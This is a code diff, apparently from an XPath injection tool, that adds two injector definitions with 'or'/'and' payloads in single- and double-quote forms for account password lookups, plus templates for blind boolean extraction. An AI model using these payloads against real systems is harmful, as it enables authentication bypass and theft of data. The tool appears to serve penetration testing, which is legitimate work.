@@ -27,6 +27,20 @@ injectors = [
                   ('{working}" and "1"="2', False),
               ),
               '{working}" and {expression} and "1"="1'),
+    Injection('or/and - single quote',
+              "/lib/account[username=smb and password='?']",
+              (
+                  ("{working}' or '1'='1", True),
+                  ("{working}' and '1'='1", False),
+              ),
+              "{working}' or {expression} and '1'='1"),
+    Injection('or/and - double quote',
+              '/lib/account[username=smb and password="?"]',
+              (
+                  ('{working}" or "1"="1', True),
+                  ('{working}" and "1"="1', False),
+              ),
+              '{working}" or {expression} and "1"="1'),
     Injection('attribute name - prefix',
               "/lib/book[?=value]",
               (
